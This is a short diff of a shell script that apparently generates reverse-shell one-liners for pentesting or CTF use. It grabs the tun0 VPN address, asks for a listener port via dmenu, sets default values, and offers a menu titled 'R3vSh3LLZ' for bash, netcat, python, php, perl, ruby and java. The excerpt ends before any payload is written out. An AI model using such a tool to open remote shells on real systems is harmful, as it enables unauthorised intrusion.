@@ -7,9 +7,20 @@
 # Created by M4t35Z
 
 
+# Needed variables
 tun0_ip=$(ip addr show tun0 2> /dev/null | grep -Po 'inet \K[\d.]+')
 port="$($1 | dmenu -p "Gimme a port u wanna listen on")"
 
+# Replace vars if they are empty
+case "" in
+    $tun0_ip) tun0_ip="10.0.0.1" ;;
+esac
+
+case "" in
+    $port) port=1234 ;;
+esac
+
+# The Juicy part
 case "$(printf "bash\\nnc(long)\\nnc(-e)\\npython\\nphp\\nperl\\nruby\\njava" | dmenu -i -p "R3vSh3LLZ")" in
 
     "bash") echo -n \
